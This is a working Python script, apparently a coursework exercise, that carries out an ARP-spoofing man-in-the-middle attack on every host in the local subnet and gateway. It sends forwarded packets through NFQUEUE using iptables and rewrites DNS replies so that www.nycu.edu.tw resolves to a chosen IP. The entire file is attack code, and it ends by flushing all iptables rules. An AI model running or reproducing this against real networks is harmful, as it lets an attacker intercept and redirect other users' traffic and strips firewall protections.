#!/usr/bin/env python3

import os, sys, re
import netifaces
import time
import scapy.all as scapy
import netfilterqueue


def address_collection():
    #get the interface
    interface = netifaces.interfaces()
    #get the gateway of all interfaces
    gateways = netifaces.gateways()
    #find the default gateway
    default_gateway = gateways['default'][netifaces.AF_INET] # netifaces.AF_INET = 2
    #print('default gateway: ',default_gateway) #('192.168.64.2','ens33')

    # use broadcast
    arp_req = scapy.ARP(pdst = str(default_gateway[0])+'/24')
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    ans = scapy.srp(arp_req_broadcast,timeout = 1, verbose = False)[0]
    address = []
    for i in ans:
        tmp = [i[1].psrc, i[1].hwsrc]# ip, mac
        if i[1].psrc == default_gateway[0]:
            gateway_info = [i[1].psrc, i[1].hwsrc]
        address.append(tmp)
        
    # return gateway and other victims' ip and MAC
    return gateway_info,address
    
    #print(address)

def enable_ip_forward():
	# Enables IP Forward in linux
	file_path = "/proc/sys/net/ipv4/ip_forward"
	f = open(file_path,"w")
	f.write('1')
	f.close()

def ARP_Spoofing(victim_ip,victim_MAC,attacker_ip):
    #need to generate an arp response in order to send it to the victim (not arp request!!!)
    #default op = 1 which means it will generate an arp request when generating an arp packet by default but we need to have response -> change it to 2
    #pdst: victim's ip
    #hwdst: victim's MAC address
    #psrc: attacker's ip
    packet = scapy.ARP(op=2,pdst=victim_ip,hwdst=victim_MAC,psrc=attacker_ip)
    #send the packet to the victim
    scapy.send(packet, verbose=False)

def spoof_packet(packet):
    # put the packet.get_payload's content into scapy.IP layer -> change to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # check if it contains DNS query
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # check the dns query
        #bytes object -> str
        #if query == www.nycu.edu.tw, redirect the webpage to 140.113.207.246
        if "www.nycu.edu.tw" in qname.decode():
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname = qname,rdata = "140.113.207.246")
            # hope only one response -> delete checksum and len field
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet))

    # use accept to send the packet to the victim
    packet.accept()


def restore_ARP_table(dst_ip,dst_MAC,src_ip,src_MAC):
    packet = scapy.ARP(op=2,pdst=dst_ip,hwdst=dst_MAC,psrc=src_ip, hwsrc=src_MAC)
    scapy.send(packet,count = 4,verbose = False)


## main
gateway, victims = address_collection()
print('Available devices')
print('-------------------------------------------')
print('IP\t\t\tMAC')
print('-------------------------------------------')
for i in victims:
    if i != gateway:
        print(i[0]+'\t\t'+i[1])
#print('gateway: ',gateway)

# create a queue, can set any number as Q number(in this program, we use 0 as Q number)
os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
enable_ip_forward()
try:
    while True:
        for victim in victims:
            if victim!=gateway:
                # tell victim that I'm router
                ARP_Spoofing(victim[0],victim[1],gateway[0])
                # tell router that I'm victim 
                ARP_Spoofing(gateway[0],gateway[1],victim[0])
        
        # in order to send the modified packet to the victim -> put the original packet into a queue
        # After modifying the packet -> send it to victim
        queue = netfilterqueue.NetfilterQueue()
        #bind the queue that we have created previously 
        # create a callback function -> execute every packet in the queue
        queue.bind(0, spoof_packet)
        queue.run()
        time.sleep(2)
        

except KeyboardInterrupt:
    # terminate ARP spoofing --> restore ARP table
    for victim in victims:
        if victim != gateway:
            restore_ARP_table(victim[0],victim[1],gateway[0],gateway[1])
            restore_ARP_table(gateway[0],gateway[1],victim[0],victim[1])

# flush iptables
os.system("iptables --flush")


